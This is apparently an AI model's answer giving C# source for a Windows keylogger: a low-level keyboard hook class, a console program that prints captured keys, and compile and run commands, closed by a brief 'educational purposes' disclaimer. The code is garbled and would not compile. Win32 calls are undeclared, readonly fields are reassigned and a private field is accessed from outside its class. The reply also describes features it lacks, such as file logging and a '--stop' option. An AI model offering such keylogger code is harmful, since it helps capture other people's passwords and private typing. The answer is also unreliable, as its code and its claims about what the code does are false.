To create a simple keyboard hook program in C# that logs keystrokes on a Windows computer, follow these steps:

**Step 1: Create a class to handle keyboard events**

```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using System.Windows.Forms;

public class KeyboardHook
{
    private readonly static int _hookId;
    private readonly static IntPtr _hook;
    private static List<KeyboardState> _keyboardStates = new List<KeyboardState>();
    private static bool _isHooked;

    private struct KeyboardState
    {
        public Keys Key;
        public bool IsKeyDown;
    }

    public static void StartKeyboardLogging(IntPtr hwnd)
    {
        if (_isHooked)
            return;

        _hookId = SetWindowsHook(WH_KEYBOARD_LL, KeyboardHookCallback);
        _isHooked = true;

        new Thread(() =>
        {
            while (_isHooked)
            {
                if (!QueueUserInputMessage(hwnd, 0))
                    Application.DoEvents();

                Thread.Sleep(100);
            }
        }, System.Threading.ThreadPriority.Normal).Start();
    }

    private static IntPtr KeyboardHookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode != 0)
            return IntPtr.Zero;

        var keystroke = (KeyboardState)Marshal.PtrToStructure(lParam);
        if (keystroke.IsKeyDown)
        {
            _keyboardStates.Add(keystroke);
            LogKeystroke(keystroke.Key);
        }

        return IntPtr.Zero;
    }

    public static void StopKeyboardLogging()
    {
        _isHooked = false;
        UnhookWindowsHook(_hookId);
    }

    private static void LogKeystroke(Keys key)
    {
        if (!Enum.IsDefined(typeof(Keys), key))
            return;

        var keyChar = (char)key;
        if (keyChar >= 'A' && keyChar <= 'Z' || keyChar >= 'a' && keyChar <= 'z' ||
            keyChar >= '0' && keyChar <= '9' || keyChar == '\\')
        {
            _keyboardStates.Add(new KeyboardState { Key = key, IsKeyDown = true });
        }
        else
        {
            _keyboardStates.Add(new KeyboardState { Key = key, IsKeyDown = true });
        }
    }

    private static int GetKeyID(Keys key)
    {
        return (int)key;
    }

    private static int SetWindowsHook(int id, LowLevelKeyboardCallback callback)
    {
        return SetWindowsHookEx(id, callback, GetWindowHandle());
    }

    private static IntPtr GetWindowHandle()
    {
        return new WindowInteropHelper(GetActiveWindow()).Handle;
    }

    private static bool QueueUserInputMessage(IntPtr hwnd, int msg)
    {
        return (int)User32.UserSendMessage(hwnd, msg, 0, 0);
    }

    private static void UnhookWindowsHook(int id)
    {
        if (_isHooked)
        {
            _isHooked = false;
            _hookId = 0;
            _hook = IntPtr.Zero;
        }
    }
}
```

**Step 2: Use the class in your main application**

```csharp
using System;

class Program
{
    [STAThread]
    static void Main(string[] args)
    {
        if (args.Length < 1)
        {
            Console.WriteLine("Usage: KeyboardLogger <filename>");
            return;
        }

        var filename = args[0];
        var keyboardHook = new KeyboardHook();
        keyboardHook.StartKeyboardLogging(IntPtr.Zero);

        Console.WriteLine("Keyboard hook installed. Log file: " + filename);

        while (true)
        {
            if (keyboardHook._keyboardStates.Count > 0)
            {
                foreach (var state in keyboardHook._keyboardStates)
                {
                    Console.WriteLine("Key: " + state.Key);
                    if (state.IsKeyDown)
                    {
                        Console.WriteLine("Down");
                    }
                }
                keyboardHook._keyboardStates.Clear();
            }
            Thread.Sleep(500);
        }
    }
}
```

**Step 3: Compile the code**

Create a `KeyboardLogger.cs` file with the above code and compile it into an executable. For example:

```cmd
csc /out:KeyboardLogger.exe /target:exe KeyboardLogger.cs
```

**Usage:**

Run the program with the desired filename:

```cmd
KeyboardLogger.exe c:/logs/logfile.txt
```

**Note:**

- **Permissions:** Ensure the program has the necessary permissions to hook the keyboard. On some systems, you might need to run it as an administrator.
- **Security:** Use this responsibly and inform the computer owner about the monitoring.
- **Special Keys:** The code checks for specific key types and logs them; special keys like Shift, Alt, and others are handled.
- **Stopping the Hook:** Use `KeyboardLogger.exe --stop` or close the application to stop logging.

**Disclaimer:** This code is for educational purposes only. Unauthorized use may be considered illegal or unethical. Always seek permission before monitoring others' computers.<｜end▁of▁sentence｜>

